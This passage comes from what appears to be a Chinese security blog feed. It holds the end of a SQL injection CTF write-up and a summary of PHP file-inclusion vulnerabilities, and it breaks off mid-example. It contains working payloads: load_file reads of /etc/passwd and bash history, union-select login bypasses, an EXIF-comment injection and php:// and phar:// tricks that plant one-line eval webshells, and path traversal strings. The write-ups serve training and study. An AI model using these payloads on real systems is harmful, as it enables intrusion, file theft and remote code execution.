class="language-none">id,bo_id,category,content</code></pre><p>经过一番查找后并没有发现存在<code>flag</code>的内容，看来<code>flag</code>并没在数据库中，不在数据库中那只能在文件中了，于是进行文件读取操作，根目录下并没有<code>flag</code>，于是我们左试右试都没发现<code>flag</code>，于是读取<code>/etc/passwd</code></p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;etc&#x2F;passwd&#39;),&#x2F;*</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509170854625.png" alt loading="lazy"></p><p><code>/etc/passwd</code>文件描述参考：<a href="http://www.suk1.top/2020/01/13/Linux_etc_passwd/#%E4%B8%BB%E7%9B%AE%E5%BD%95-%E5%92%8C-Shell">Linux passwd 文件详解</a></p><p>注意到最后一行，<code>www:x:500:500:www:/home/www:/bin/bash</code>www用户在<code>/home/www</code>的目录下进行了<code>/bin/bash</code>的<code>shell</code>操作，于是我们利用<code>.bash_history</code>查找用户使用过的历史命令</p><ul><li><code>.bash_history</code>：保存了当前用户使用过的历史命令,方便查找，参考：<a href="https://blog.csdn.net/caolaosanahnu/article/details/7601074">linux中Shell历史命令记录文件的路径是什么</a></li></ul><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;home&#x2F;www&#x2F;.bash_history&#39;),&#x2F;*</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509171610258.png" alt loading="lazy"></p><p>可以到进行了如上操作，切换到<code>/tmp</code>目录下，解压<code>html.zip</code>的压缩包，删除压缩包，复制<code>html</code>目录及其子目录到<code>/var/www/html</code>目录下，然后删除了<code>.DS_Store</code>文件，开启<code>Apache</code>服务</p><ul><li><code>.DS_Store</code>：Mac OS 保存文件夹的自定义属性的隐藏文件</li></ul><p>这个过程看上去没毛病，但是中间漏了一点，<code>/tmp</code>目录下了<code>html</code>文件夹中的<code>.DS_Store</code>文件并没用被删除，于是我们尝试读取这个文件，直接读取在页面上回显并不完全</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172422699.png" alt loading="lazy"></p><p>于是通过<code>hex</code>方式进行读取</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; hex(load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;)),&#x2F;*</code></pre><p>得到一长串十六进制数字，放到网站上转文本</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172701095.png" alt loading="lazy"></p><p>可以看到应该存放<code>flag</code>的文件，进行读取</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">a&#39;,content &#x3D; load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;),&#x2F;*</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200509172916732.png" alt loading="lazy"></p><p>成功拿到flag</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><h3 id="安恒杯-新春祈福赛—BabySqli"><a href="#安恒杯-新春祈福赛—BabySqli" class="headerlink" title="安恒杯-新春祈福赛—BabySqli"></a>安恒杯-新春祈福赛—BabySqli</h3><p><strong>解题核心</strong>—————–MD5绕过</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/FUeKLit8HApfNOP.png" alt loading="lazy"></p><p>题目给出的提示：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/53qyMpFJAaSEcBz-1586920617685.png" alt loading="lazy"></p><p>随便登录后在前端HTML中都能看到这样一串字母</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--></span></code></pre><p>base32解码后得到</p><pre class="language-none"><code class="language-none">c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw&#x3D;&#x3D;</code></pre><p>base64解码后得到</p><pre class="language-sql" data-language="sql"><code class="language-sql">select * from user where username &#x3D; &#39;$name&#39;</code></pre><p>sqlmap测试后可以得到admin的密码MD5值，找不到原码</p><p>于是参考MD5绕过，参考：<a href="https://www.gem-love.com/websecurity/453.html">简析GXY_CTF “BabySqli v1.0″绕过md5比较</a></p><p>利用以下注入语句</p><pre class="language-sql" data-language="sql"><code class="language-sql">name: admin&#39; And 1&gt;2 union select &#39;1&#39;,&#39;admin&#39;,&#39;c4ca4238a0b923820dcc509a6f75849bpw: 1</code></pre><p>注：</p><ul><li>根据得到的sql后台查询语句，需要用单引号闭合，故最后不用加单引号</li><li>union select后的查询当字符串使用需要加单引号，当然数字可以不加单引号</li><li>过滤了and可以用大写And绕过</li><li>1 的MD5值为c4ca4238a0b923820dcc509a6f75849b</li></ul><p>于是当前面的语句And 1&gt;2永不成立，联合查询后面的语句就会在数据库中查询显示出来</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL注入/XHqfk2AmYUGvNyr-1586920623970.png" style="zoom:67%;" loading="lazy"><p>于是这时输入password=1即可绕过查询得到flag</p><h3 id="36D—WEB-你没见过的注入"><a href="#36D—WEB-你没见过的注入" class="headerlink" title="36D—WEB_你没见过的注入"></a>36D—WEB_你没见过的注入</h3><p>在<code>robots.txt</code>拿到可以直接重置管理员密码的界面<code>pwdreset.php</code>，然后再从前台登录进去，发现是一个文件上传的页面<code>main.php</code>， 界面没有做什么上传限制，但是在上传上去之后会跳转到显示文件列表的界面<code>filelist.php</code>，后台将文件名和后缀都改了，文件名应该是md5加盐后得到的一串字符串，后缀为zip文件，并且可以将文件直接下载下来，下载下来后压缩包打不开，用文本编辑器打开后里面的内容就是我们上传上去文件的内容，后台将其的名字和后缀都改了，测试绕过，无果</p><p>参考：<a href="https://www.gem-love.com/ctf/2283.html#你没见过的注入">你没见过的注入</a></p><p>再看到文件列表显示的界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506213728072.png" alt loading="lazy"></p><p>除了文件名之外后面还有一串类似文件格式一样的东西，详见上面大佬的博客吧，这里给出解题步骤：</p><p>这里考的是<code>EXIF</code>信息中<code>comment</code>字段注入，这个字段会存入数据库，<code>finfo-&gt;file()</code>再在后面输出这个信息，造成了sql注入漏洞，先去网上下载一个<code>exiftool</code>工具 ——&gt;  <a href="https://exiftool.org/">https://exiftool.org/</a></p><p>可以编辑图片的的<code>EXIF</code>信息</p><p>payload：</p><pre class="language-shell" data-language="shell"><code class="language-shell">.&#x2F;exiftool -overwrite_original -comment&#x3D;&quot;y1ng\&quot;&#39;);select 0x3C3F3D60245F504F53545B305D603B into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;#&quot; 1.jpg</code></pre><p><code>hex(&lt;?=$_POST[0];)</code>=<code>0x3C3F3D60245F504F53545B305D603B</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215714097.png" alt loading="lazy"></p><p>然后直接上传到网站上去就可以拿shell了（这里png图片无效，不知道为啥）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200506215937088.png" alt loading="lazy"></p><h3 id="Hack-lu-2017-FlatScience"><a href="#Hack-lu-2017-FlatScience" class="headerlink" title="Hack.lu-2017-FlatScience"></a>Hack.lu-2017-FlatScience</h3><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170522200.png" alt loading="lazy"></p><p>这个网站有很多的<code>pdf</code>文件可以下载，暂时没有什么线索</p><p>访问<code>robots.txt</code>得到<code>login.php</code>和<code>admin.php</code>两个登录界面，<code>admin.php</code>源码存在<code>hint：do not even try to bypass this</code>，<code>login.php</code>源码也存在<code>TODO: Remove ?debug-Parameter!</code>，于是访问<code>/login.php?debug</code>得到<code>login.php</code>的源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpob_start();?&gt;..................(HTML)&lt;?phpif(isset($_POST[&#39;usr&#39;]) &amp;&amp; isset($_POST[&#39;pw&#39;]))&#123;        $user &#x3D; $_POST[&#39;usr&#39;];        $pass &#x3D; $_POST[&#39;pw&#39;];        $db &#x3D; new SQLite3(&#39;..&#x2F;fancy.db&#39;);        $res &#x3D; $db-&gt;query(&quot;SELECT id,name from Users where name&#x3D;&#39;&quot;.$user.&quot;&#39; and password&#x3D;&#39;&quot;.sha1($pass.&quot;Salz!&quot;).&quot;&#39;&quot;);    if($res)&#123;        $row &#x3D; $res-&gt;fetchArray();    &#125;    else&#123;        echo &quot;&lt;br&gt;Some Error occourred!&quot;;    &#125;    if(isset($row[&#39;id&#39;]))&#123;            setcookie(&#39;name&#39;,&#39; &#39;.$row[&#39;name&#39;], time() + 60, &#39;&#x2F;&#39;);            header(&quot;Location: &#x2F;&quot;);            die();    &#125;&#125;if(isset($_GET[&#39;debug&#39;]))highlight_file(&#39;login.php&#39;);?&gt;................(HTML)</code></pre><p>可以看到用的是<code>SQLite</code>数据库，并且可直接查询，未经过过滤，但是密码进行了加密，先看看里面有什么东西，网上查<code>sqlite</code>的语法，和其它数据库大同小异，过程如下：</p><p>查表：</p><pre class="language-sql" data-language="sql"><code class="language-sql">usr&#x3D;1&#39; union select name,name FROM sqlite_master WHERE type&#x3D;&#39;table&#39; limit 0,1--+&amp;pw&#x3D;111 </code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SQL%E6%B3%A8%E5%85%A5/image-20200517170020527.png" alt loading="lazy"></p><p>查表名及其对应的结构：</p><pre class="language-sql" data-language="sql"><code class="language-sql">usr&#x3D;1&#39; union select name,sql FROM sqlite_master WHERE type&#x3D;&#39;table&#39; limit 0,1--+&amp;pw&#x3D;111</code></pre><p>得到：<code>CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255))</code>，可以看到有一个<code>hint</code>字段</p><p>再将内容查询出来：</p><pre class="language-sql" data-language="sql"><code class="language-sql">usr&#x3D;1&#39; union select name,(id&#x2F;name&#x2F;password) FROM Users limit (0&#x2F;1&#x2F;2),1--+&amp;pw&#x3D;111</code></pre><pre class="language-none"><code class="language-none">1,admin,3fab54a50e770d830c0416df817567662a9dc85c,my fav word in my fav paper?!2,fritze,54eae8935c90f467427f05e4ece82cf569f89507,my love is…?3,hansi,34b0bb7c304949f9ff2fc101eef0f048be10d3bd,the password is password</code></pre><p>表中只有以上三行字段内容，根据<code>hint</code>可知，应该是要在<code>fav paper</code>中找到一个词+<code>Salz</code>之后<code>sha1</code>得到的值为<code>34b0bb7c304949f9ff2fc101eef0f048be10d3bd</code>，这个单词应该就是<code>admin</code>的密码，应该就在前面的那些<code>paper</code>的<code>pdf</code>文件里，于是用<code>wget</code>命令将其全都下载下来：</p><pre class="language-bash" data-language="bash"><code class="language-bash">wget http:&#x2F;&#x2F;124.126.19.106:43631&#x2F; -r -np -nd -A .pdf</code></pre><p>再用脚本遍历所有<code>pdf</code>文件中的单词</p><pre class="language-python" data-language="python"><code class="language-python">from io import StringIOfrom pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreterfrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom pdfminer.pdfpage import PDFPageimport sysimport stringimport osimport hashlibdef get_pdf():    return [&quot;..&#x2F;FlatScience&#x2F;&quot; + i for i in os.listdir(&quot;..&#x2F;FlatScience&#x2F;&quot;) if i.endswith(&quot;pdf&quot;)]def convert_pdf_2_text(path):    rsrcmgr &#x3D; PDFResourceManager()    retstr &#x3D; StringIO()    device &#x3D; TextConverter(rsrcmgr, retstr, laparams&#x3D;LAParams())    interpreter &#x3D; PDFPageInterpreter(rsrcmgr, device)    with open(path, &#39;rb&#39;) as fp:        for page in PDFPage.get_pages(fp, set()):            interpreter.process_page(page)        text &#x3D; retstr.getvalue()    device.close()    retstr.close()    return textdef find_password():    pdf_path &#x3D; get_pdf()    # print(pdf_path)    for i in pdf_path:        print(&quot;Searching word in &quot; + i)        pdf_text &#x3D; convert_pdf_2_text(i).split(&quot; &quot;)        for word in pdf_text:            sha1_password &#x3D; hashlib.sha1((word + &quot;Salz!&quot;).encode()).hexdigest()            if sha1_password &#x3D;&#x3D; &#39;3fab54a50e770d830c0416df817567662a9dc85c&#39;:                print(&quot;Find the password :&quot; + word)                exit()if __name__ &#x3D;&#x3D; &quot;__main__&quot;:    find_password()</code></pre><p>最后跑出<code>password</code>为<code>ThinJerboa</code>，在<code>admin.php</code>登录即可得到<code>flag</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞小结</title>
      <link href="/posts/73702816/"/>
      <url>/posts/73702816/</url>
      
        <content type="html"><![CDATA[<p>文件包含作用函数：</p><pre class="language-php" data-language="php"><code class="language-php">require&#x2F;&#x2F;包含过程中出现错误直接退出程序include();&#x2F;&#x2F;包含过程出现错误，抛出警告，程序继续运行require_once();&#x2F;&#x2F;包括require()的功能，但函数只包含一次include_once();&#x2F;&#x2F;包括include()的功能，但函数只包含一次</code></pre><p>该函数用以加载另一个文件中的php代码，并且当php来执行</p><p>而漏洞产生的原因则是因为当函数中的参数未经过严格的过滤，且用户可控时，当用户包含了其它恶意文件代码，就导致执行了非预期操作</p><a id="more"></a><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>无限制：</p><pre class="language-php" data-language="php"><code class="language-php">2.php代码：&lt;?php $a &#x3D; $_GET[&#39;a&#39;]; include($a);?&gt;1.php代码：&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315203414355.png" alt loading="lazy"></p><p>可用于读取系统其它文件的内容</p><p>例如<code>2.php?a=../../../../../../../etc/passwd</code></p><p>有限制：</p><pre class="language-php" data-language="php"><code class="language-php">2.php代码：&lt;?php $a &#x3D; $_GET[&#39;a&#39;];include($a.&quot;.html&quot;);?&gt;1.php代码：&lt;?php phpinfo();?&gt;</code></pre><p>绕过方法：</p><p><code>%00</code>截断，条件：<code>magic_quotes_gpc</code> = <code>Off</code>，php版本&lt;<code>5.3.4</code></p><p>路径长度截断，条件：php版本&lt;<code>5.2.8</code></p><p>windows OS –&gt; 在文件后加点，点号需要长于256；linux OS –&gt; 用<code>./</code>，需长于4096</p><blockquote><p>Windows下目录最大长度为256字节，超出的部分会被丢弃；</p><p>Linux下目录最大长度为4096字节，超出的部分会被丢弃。</p></blockquote><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>无限制：</p><pre class="language-php" data-language="php"><code class="language-php">2.php代码：&lt;?php $a &#x3D; $_GET[&#39;a&#39;]; include($a);?&gt;1.php代码：&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315210218269.png" alt loading="lazy"></p><p>有限制：</p><pre class="language-php" data-language="php"><code class="language-php">2.php代码：&lt;?php $a &#x3D; $_GET[&#39;a&#39;];include($a.&quot;.html&quot;);?&gt;1.php代码：&lt;?php phpinfo();?&gt;</code></pre><p>在末尾加上<code>%3f</code>，<code>%23</code>绕过</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315210124764.png" alt loading="lazy"></p><h3 id="PHP支持的协议和封装协议"><a href="#PHP支持的协议和封装协议" class="headerlink" title="PHP支持的协议和封装协议"></a>PHP支持的协议和封装协议</h3><h4 id="php-伪协议"><a href="#php-伪协议" class="headerlink" title="php://伪协议"></a>php://伪协议</h4><p><strong>条件</strong></p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li></ul><p><code>php://</code> 访问各个输入/输出流（I/O streams），常使用<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p><h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>当<code>enctype=”multipart/form-data”</code>时<code>php://input</code>无效</p><p>用法<code>?file=php://input</code>，利用POST传入</p><p>利用<code>php://input</code>写马（亦可命令执行）：</p><pre class="language-php" data-language="php"><code class="language-php">2.php代码：&lt;?php $a &#x3D; $_GET[&#39;a&#39;]; include($a);?&gt;</code></pre><p>要求：同时开启 <code>allow_url_fopen</code> 和 <code>allow_url_include</code>（PHP &lt; 5.3.0）即可造成任意代码执行</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315212029230.png" alt loading="lazy"></p><h5 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h5><p><strong>使用</strong></p><p>一种元封装器， 设计用于数据流打开时的<a href="https://www.php.net/manual/zh/filters.php">筛选过滤</a>应用。</p><p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507163438086.png" alt loading="lazy"></p><p><strong>可用的过滤器列表（4类）</strong></p><table><thead><tr><th><strong>字符串过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th><strong>转换过滤器</strong></th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th><strong>加密过滤器</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table><ol><li><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</li><li><code>php://input + [POST DATA]</code>执行php代码</li></ol><p><strong>演示</strong></p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$content &#x3D; &#39;&lt;?php exit; ?&gt;&#39;;$content .&#x3D; $_POST[&#39;txt&#39;];file_put_contents($_POST[&#39;filename&#39;], $content);</code></pre><p>成功写马</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507174823081.png" alt loading="lazy"></p><p><code>string.strip_tags</code>方法</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507180043996.png" alt loading="lazy"></p><p><strong><a href="https://www.php.net/manual/zh/filters.string.strip_tags.php">string.strip_tags</a></strong>：使用此过滤器等同于用 <code>strip_tags()</code>函数处理所有的流数据。可以用两种格式接收参数：一种是和 <code>strip_tags()</code>函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。</p><p><strong><a href="https://www.php.net/manual/zh/function.strip-tags.php">strip_tags()</a></strong>：从字符串中去除 HTML 和 PHP 标记</p><p><strong>ROT13</strong>方法</p><p>编码解码网站：<a href="https://cryptii.com/pipes/rot13-decoder">https://cryptii.com/pipes/rot13-decoder</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200507180852771.png" alt loading="lazy"></p><h4 id="file-伪协议"><a href="#file-伪协议" class="headerlink" title="file://伪协议"></a>file://伪协议</h4><p><strong>条件</strong></p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul><p><strong>用法</strong></p><p>用于访问本地文件系统</p><ol><li><strong>file://[文件的绝对路径和文件名]</strong>   <code>a=file://D:/phpstudy/WWW/test/1.php</code></li><li><strong>[文件的相对路径和文件名]</strong>   <code>a=./1.php</code></li><li><strong>[http：//网络路径和文件名]</strong>  <code>a=http://127.0.0.1/phpinfo.txt</code></li></ol><p><strong>演示</strong></p><pre class="language-php" data-language="php"><code class="language-php">2.php代码：&lt;?php $a &#x3D; $_GET[&#39;a&#39;]; include($a);?&gt;1.php代码：&lt;?php phpinfo();?&gt;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315212627490.png" alt loading="lazy"></p><h4 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h4><p><strong>条件</strong></p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul><p><strong>用法</strong></p><p>自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p><ol><li><code>data://text/plain;base64,</code></li><li><code>data://text/plain,</code></li><li><code>data:text/plain;base64,</code></li><li><code>data:text/plain,</code></li></ol><p><strong>演示</strong></p><pre class="language-php" data-language="php"><code class="language-php">2.php代码：&lt;?php $a &#x3D; $_GET[&#39;a&#39;]; include($a);?&gt;</code></pre><pre class="language-php" data-language="php"><code class="language-php">&lt;?php phpinfo(); &#x3D;&#x3D;&#x3D;base64&#x3D;&#x3D;&#x3D;&gt;  PD9waHAgcGhwaW5mbygpOw&#x3D;&#x3D;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315213202734.png" alt loading="lazy"></p><p>读取文件内容操作</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php show_source(&#39;1.php&#39;); &#x3D;&#x3D;&#x3D;base64&#x3D;&#x3D;&#x3D;&gt;   PD9waHAgc2hvd19zb3VyY2UoJzEucGhwJyk7</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315214340393.png" alt loading="lazy"></p><h4 id="phar-伪协议"><a href="#phar-伪协议" class="headerlink" title="phar://伪协议"></a>phar://伪协议</h4><p>用法：<code>?a=phar://压缩包/内部文件 phar://xxx.png/shell.php</code></p><pre class="language-php" data-language="php"><code class="language-php">2.php代码：&lt;?php $a &#x3D; $_GET[&#39;a&#39;]; include($a);?&gt;</code></pre><p>注意： <code>PHP &gt; =5.3.0</code> 压缩包需要是<code>zip</code>协议压缩，<code>rar</code>不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。 </p><p>步骤： 写一个一句话木马文件<code>shell.php</code>，然后用<code>zip</code>协议压缩为<code>shell.zip</code>，然后将后缀改为<code>png</code>等其他格式。 </p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315215247124.png" alt loading="lazy"></p><p>亦可写马</p><pre class="language-php" data-language="php"><code class="language-php">cmd&#x3D;fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315215651827.png" alt loading="lazy"></p><h4 id="http-amp-https-伪协议"><a href="#http-amp-https-伪协议" class="headerlink" title="http:// &amp; https:// 伪协议"></a>http:// &amp; https:// 伪协议</h4><p><strong>条件</strong></p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul><p><strong>用法</strong></p><pre class="language-http" data-language="http"><code class="language-http">http:&#x2F;&#x2F;example.comhttp:&#x2F;&#x2F;example.com&#x2F;file.php?var1&#x3D;val1&amp;var2&#x3D;val2http:&#x2F;&#x2F;user:password@example.comhttps:&#x2F;&#x2F;example.comhttps:&#x2F;&#x2F;example.com&#x2F;file.php?var1&#x3D;val1&amp;var2&#x3D;val2https:&#x2F;&#x2F;user:password@example.com</code></pre><h4 id="zip-amp-bzip2-amp-zlib-伪协议"><a href="#zip-amp-bzip2-amp-zlib-伪协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib://伪协议"></a>zip:// &amp; bzip2:// &amp; zlib://伪协议</h4><p><strong>条件</strong></p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul><p><strong>用法</strong></p><p><code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p><ol><li><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</li><li><code>compress.bzip2://file.bz2</code>   压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</li><li><code>compress.zlib://file.gz</code>   压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</li></ol><p><strong>演示</strong></p><pre class="language-php" data-language="php"><code class="language-php">2.php代码：&lt;?php $a &#x3D; $_GET[&#39;a&#39;]; include($a);?&gt;</code></pre><p>用法：<code>?file=zip://[压缩文件绝对路径]#[压缩文件内的子文件名] zip://xxx.png#shell.php</code></p><p>条件： PHP &gt; =5.3.0， #在浏览器中要编码为%23</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/image-20200315220043657.png" alt loading="lazy"></p><p>亦可与上面的一样就行写马操作</p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="ZJCTF-2019-NiZhuanSiWei"></a>ZJCTF-2019-NiZhuanSiWei</h4><pre class="language-php" data-language="php"><code class="language-php">&lt;?php  $text &#x3D; $_GET[&quot;text&quot;];$file &#x3D; $_GET[&quot;file&quot;];$password &#x3D; $_GET[&quot;password&quot;];if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;        echo &quot;Not now!&quot;;        exit();     &#125;else&#123;        include($file);  &#x2F;&#x2F;useless.php        $password &#x3D; unserialize($password);        echo $password;    &#125;&#125;else&#123;    